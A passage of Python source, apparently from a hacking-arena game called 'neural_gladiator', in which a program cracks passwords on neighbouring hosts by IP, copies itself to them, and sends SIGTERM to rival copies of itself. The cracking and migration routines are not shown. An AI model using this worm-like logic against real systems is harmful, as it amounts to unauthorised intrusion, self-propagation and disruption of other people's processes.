                        all_candidates.append((nx, ny, dist, target_ip))
            
            # Sort by distance to target (closest first)
            all_candidates.sort(key=lambda x: x[2])
            candidate_neighbors = all_candidates[:3] 

            # 5. Try to migrate
            moved = False
            for nx, ny, dist, target_ip in candidate_neighbors:
                if moved: break
                
                password = crack_node(target_ip, nx, ny)
                if password:
                    log(f"🚩 Cracked {target_ip}! Migrating...")
                    save_brain_memory() # Save before we leave!
                    migrate_self(target_ip, password, TEAM)
                    # NOTE: If migrate_self succeeds, os._exit(0) is called
                    log(f"⚠️ Migration failed: {target_ip}")

            if not moved:
                log_status(f"🔥 Waiting for opening at ({my_x},{my_y})...")
                
                # --- COMBAT LOGIC ---
                try:
                    output = subprocess.check_output(['ps', 'aux']).decode().splitlines()
                    my_pid = os.getpid()
                    
                    for line in output:
                        if 'neural_gladiator.py' in line and 'python3' in line:
                            parts = line.split()
                            pid = int(parts[1])
                            if pid != my_pid:
                                log(f"⚔️ ENEMY SIGHTED (PID {pid}). FIRE AT WILL!")
                                try:
                                    log(f"🔫 Firing SIGTERM at PID {pid}...")
                                    os.kill(pid, signal.SIGTERM) 
                                    time.sleep(0.5)
                                    try:
                                        os.kill(pid, 0) 
                                        log(f"⚠️ Enemy (PID {pid}) SURVIVED the shot!")
                                    except OSError:
                                        log(f"💀 Enemy (PID {pid}) neutralized.")
                                        hacking_brain["kills"] = hacking_brain.get("kills", 0) + 1
                                        save_brain_memory()
                                except Exception as e:
                                    log(f"⚔️ Fire Failed: {e}")
                except: pass
                
                time.sleep(2)
    except Exception as e:
        log(f"💥 CRITICAL CRASH in main(): {e}")
        import traceback
        traceback.print_exc()

def signal_handler(signum, frame):
    log(f"🛑 RECEIVED SIGNAL {signum}. Saving memory and exiting...")
    save_brain_memory()
    sys.exit(0)

if __name__ == "__main__":
    signal.signal(signal.SIGTERM, signal_handler)
    signal.signal(signal.SIGINT, signal_handler)
    main()
